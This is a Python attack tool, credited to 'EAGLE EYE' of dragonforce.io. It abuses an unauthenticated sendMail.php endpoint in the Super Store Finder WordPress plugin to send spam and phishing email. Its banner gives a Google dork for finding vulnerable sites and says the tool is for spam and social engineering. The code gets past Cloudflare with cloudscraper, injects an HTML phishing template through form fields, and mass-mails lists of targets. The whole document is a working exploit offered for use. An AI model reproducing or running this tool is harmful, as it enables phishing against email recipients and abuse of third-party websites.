import cloudscraper, sys, os, colorama, time, ctypes, datetime, sys, platform, threading
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime

today = date.today()
d2 = today.strftime("%B %d, %Y")

if platform.system()=='Linux':
    os.system('clear')
    sys.stdout.write("\x1b]2;SPAM-PHISHING MAIL DFM {}\x07".format(d2))
else:
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'SPAM-PHISHING MAIL DFM | {d2}')

print(f"""{Style.BRIGHT + Fore.RED}
 ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
 ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
 ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
 ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                             
{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
{Style.BRIGHT + Fore.YELLOW}  
                                           Email Mass SPAM by EAGLE EYE
                            Google Dorks(example) : inurl:/wp-content/plugins/superstorefinder/
                                    https://dragonforce.io | Telegram: dragonforceio
                                Get Started With (pip install -r requirements.txt)                                                 
                                      USED FOR SPAM MAIL AND SOCIAL ENGINEERING                                            

{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
""")

def helpdesk():
    print(Style.BRIGHT+"Usage (example) : python ssf.py -u https://lol.com/ -s admin@lol.com -x template.txt -r target@mail.com --single")
    print(Style.BRIGHT+"Usage (example) : python ssf.py -u https://lol.com/ -s admin@lol.com -x template.txt -r targetlist.txt --mass")
    print(Style.BRIGHT+"Usage (example) : python ssf.py -u https://lol.com/ -s admin@lol.com -x template.txt -r target@mail.com --singlemass -c 10")

def mailList(txt):
    try:
        f = open(txt,'r')
        return f.readlines()
    except FileNotFoundError:
        print(Style.BRIGHT+Fore.RED+"File '{}' not found".format(txt))

def loadTemplate(txt):
    try:
        f = open(txt,'rb')
        return f.read().decode('utf-8')
    except:
        print(Style.BRIGHT+Fore.RED+"File '{}' not found".format(txt))

def position(arr,types):
    if(types=="-u" or types=="-s" or types=="-r" or types=="-x" or types=="-c"):
        return arr.index(types) + 1
    else:
        print(Style.BRIGHT+Fore.White+"\t\t\t\tNo such options for {}!".format(types))
        helpdesk()
        sys.exit(0)
        os._exit(0)

def arglength():
    if(len(sys.argv)>12):
        helpdesk()
        return False
    else:
        return True

def spamMail(url,sender,receiver,temp):
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    headers = {"Content-Type":"application/x-www-form-urlencoded"}
    templateX = '-->'+loadTemplate(temp)
    data = {
        'name_lbl' : '<!--',
        'email_lbl': 'Scripting',
        'msg_lbl' : 'By Eagle Eye',
        'name':'Supporter',
        'email': sender,
        'rcvEmail' : receiver,
        'subject' : 'This is subject 3',
        'message' : templateX,
        'submit' : 'send'
    }
    try:
        sendmail = scraper.post(url,data=data,headers=headers)
        if(sendmail.status_code>=200 and sendmail.status_code<=299):
            print(Style.BRIGHT+Fore.GREEN+"Mail successfully send to target -> {}".format(receiver))
        else:
            print(Style.BRIGHT+Fore.RED+"Mail unsuccessfully send to target -> {}".format(receiver))
    except:
        print(Style.BRIGHT+Fore.RED+"Theres no connection for the site -> {}".format(url))

def wpURL(url):
    web_arr = urlparse(url)
    if(web_arr.path==url and web_arr.netloc=="" and web_arr.scheme==""):
        return "http://" + url + "/wp-content/plugins/superstorefinder-wp/sendMail.php"
    elif(web_arr.netloc==url and web_arr.path==""):
        return url + "/wp-content/plugins/superstorefinder-wp/sendMail.php"
    else:
        return url + "/wp-content/plugins/superstorefinder-wp/sendMail.php"

def phpURL(url):
    web_arr = urlparse(url)
    if(web_arr.path==url and web_arr.netloc=="" and web_arr.scheme==""):
        return "http://" + url + "/sendMail.php"
    elif(web_arr.netloc==url and web_arr.path==""):
        return url + "/sendMail.php"
    else:
        return url + "/sendMail.php"


def exploit(url,sender,temp,word,types):
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    wpx = wpURL(url)
    phpx = phpURL(url)
    try:
        if types=="mass":
            lines = mailList(word)
            if(scraper.get(wpx).status_code==200 and scraper.get(phpx).status_code!=200):
                for line in lines:
                    spamMail(wpx,sender,line.replace("\n",""),temp)
            elif(scraper.get(phpx).status_code==200 and scraper.get(wpx).status_code!=200):
                for line in lines:
                    spamMail(phpx,sender,line.replace("\n",""),temp)
            else:
                print(Style.BRIGHT+Fore.RED+"Site seems not exploitable, check back url with path-> {}".format(url))
        elif types=="single":
            if(scraper.get(wpx).status_code==200 and scraper.get(phpx).status_code!=200):
                spamMail(wpx,sender,word,temp)
            elif(scraper.get(phpx).status_code==200 and scraper.get(wpx).status_code!=200):
                spamMail(phpx,sender,word,temp)
            else:
                print(Style.BRIGHT+Fore.RED+"Site seems not exploitable, check back url with path-> {}".format(url))
        elif types=="singlemass":
            if(scraper.get(wpx).status_code==200 and scraper.get(phpx).status_code!=200):
                spamMail(wpx,sender,word,temp)
            elif(scraper.get(phpx).status_code==200 and scraper.get(wpx).status_code!=200):
                spamMail(phpx,sender,word,temp)
            else:
                print(Style.BRIGHT+Fore.RED+"Site seems not exploitable, check back url with path-> {}".format(url))
        else:
            print(Style.BRIGHT+Fore.RED+"No such options for {}".format(types))
    except:
        print(Style.BRIGHT+Fore.RED+"Site seems not exploitable, check back url with path-> {}".format(url))


if(arglength()==True):
    try:
        target = position(sys.argv,'-u')
        sender = position(sys.argv,'-s')
        receiver = position(sys.argv,'-r')
        template = position(sys.argv,'-x')
        if(sys.argv[9]=="--mass"):
            exploit(sys.argv[target],sys.argv[sender],sys.argv[template],sys.argv[receiver],"mass")
        elif(sys.argv[9]=="--single"):
            exploit(sys.argv[target],sys.argv[sender],sys.argv[template],sys.argv[receiver],"single")
        elif(sys.argv[9]=="--singlemass"):
            count = position(sys.argv,'-c')
            for l in range(int(sys.argv[count])):
                exploit(sys.argv[target],sys.argv[sender],sys.argv[template],sys.argv[receiver],"singlemass")
        else:
            print(Style.BRIGHT+Fore.RED+"No such options for {}".format(sys.argv[9]))
    except:
        helpdesk()
        sys.exit(0)
else:
    try:
        sys.exit(0)
    except SystemExit:
        os._exit(0)
